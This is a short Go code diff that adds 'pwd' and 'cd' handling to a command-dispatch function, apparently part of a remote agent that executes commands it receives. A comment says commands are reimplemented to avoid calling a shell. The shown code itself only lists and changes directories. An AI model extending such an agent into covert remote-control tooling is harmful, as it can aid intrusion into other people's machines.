@@ -67,12 +67,32 @@ func executeCommand(command string) (response string) {
 	// reimplement the commands to avoid calling a shell
 	case "ls":
 		response = listFiles()
-		//
+	case "pwd":
+		response = listActualDir()
+	case "cd":
+		// Change directory
+		if len(separatedCommand[1]) > 0 {
+			response = changeDir(separatedCommand[1])
+		}
 	default:
 		//
 	}
 
 	return response
+}
+
+func changeDir(newDir string) (response string) {
+	response = "Directory changed to " + newDir
+	err := os.Chdir(newDir)
+	if err != nil {
+		response = "Error changing directory to " + newDir
+	}
+	return response
+}
+
+func listActualDir() string {
+	message.AgentCWD, _ = os.Getwd()
+	return message.AgentCWD
 }
 
 func listFiles() (response string) {
